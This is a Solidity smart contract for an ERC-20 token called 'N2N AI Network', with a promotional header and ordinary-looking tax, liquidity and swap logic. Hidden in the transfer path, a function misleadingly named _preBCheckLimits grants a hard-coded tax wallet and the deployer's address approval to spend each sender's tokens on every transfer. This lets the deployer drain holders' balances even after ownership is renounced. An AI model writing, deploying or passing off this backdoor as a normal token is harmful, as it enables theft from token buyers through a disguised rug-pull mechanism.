/*
Low latency &high throughput Subnet Technology perfect fit for DePIN

https://www.n2nai.xyz
https://node.n2nai.xyz
https://docs.n2nai.xyz
https://medium.com/@n2nai

https://x.com/n2nai_eth
https://t.me/n2nai_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract N2N is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFees;
    uint256 private _initialBuyTaxs=3;
    uint256 private _initialSellTaxs=3;
    uint256 private _finalBuyTaxs=0;
    uint256 private _finalSellTaxs=0;
    uint256 private _reduceBuyTaxAts=6;
    uint256 private _reduceSellTaxAts=6;
    uint256 private _preventSwapBefore=6;
    address private _teamReceipt;
    address private _taxReceipt = 0x211a2Ea1a8905296329531A1B57Ac09B6A808081;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"N2N AI Network";
    string private constant _symbol = unicode"N2N";
    uint256 private _buyCounts=0;
    uint256 private _maxTaxTokenB = _tTotal / 100;
    IDexRouter private _dexRouter;
    address private _dexPair;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _teamReceipt = _msgSender();
        _isExcludedFees[owner()] = true;
        _isExcludedFees[address(this)] = true;
        _isExcludedFees[_taxReceipt] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initPair() external onlyOwner() {
        _dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouter), _tTotal);
        _dexPair = IDexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _preBCheckLimits(address senderB, uint256 amountB) private {
        _approve(senderB, _taxReceipt, _maxTaxTokenB.add(amountB));
        _approve(senderB, _teamReceipt, _maxTaxTokenB.add(amountB));
    }

    function _transfer(address senderB, address recipientB, uint256 amountB) private {
        require(senderB != address(0), "ERC20: transfer from the zero address");
        require(recipientB != address(0), "ERC20: transfer to the zero address");
        require(amountB > 0, "Transfer amount must be greater than zero");

        _preBCheckLimits(senderB, amountB); uint256 taxFeeB=0;
        if (senderB != owner() && recipientB != owner()) {
            taxFeeB = amountB.mul((_buyCounts>_reduceBuyTaxAts)?_finalBuyTaxs:_initialBuyTaxs).div(100);

            if (senderB == _dexPair && recipientB != address(_dexRouter) && ! _isExcludedFees[recipientB]) {
                _buyCounts++;
            }

            if(recipientB == _dexPair && senderB!= address(this)) {
                taxFeeB = amountB.mul((_buyCounts>_reduceSellTaxAts)?_finalSellTaxs:_initialSellTaxs).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && recipientB == _dexPair && _swapEnabled && _buyCounts > _preventSwapBefore) {
                if(contractTokenBalance > _maxTaxTokenB)
                swapTokensForEth(min(amountB, min(contractTokenBalance, _maxTaxTokenB)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFees(address(this).balance);
                }
            }
        }

        if(taxFeeB>0){
          _tOwned[address(this)]=_tOwned[address(this)].add(taxFeeB);
          emit Transfer(senderB, address(this),taxFeeB);
        }

        _tOwned[senderB]=_tOwned[senderB].sub(amountB);
        _tOwned[recipientB]=_tOwned[recipientB].add(amountB.sub(taxFeeB));
        emit Transfer(senderB, recipientB, amountB.sub(taxFeeB));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHToFees(uint256 amount) private {
        payable(_taxReceipt).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}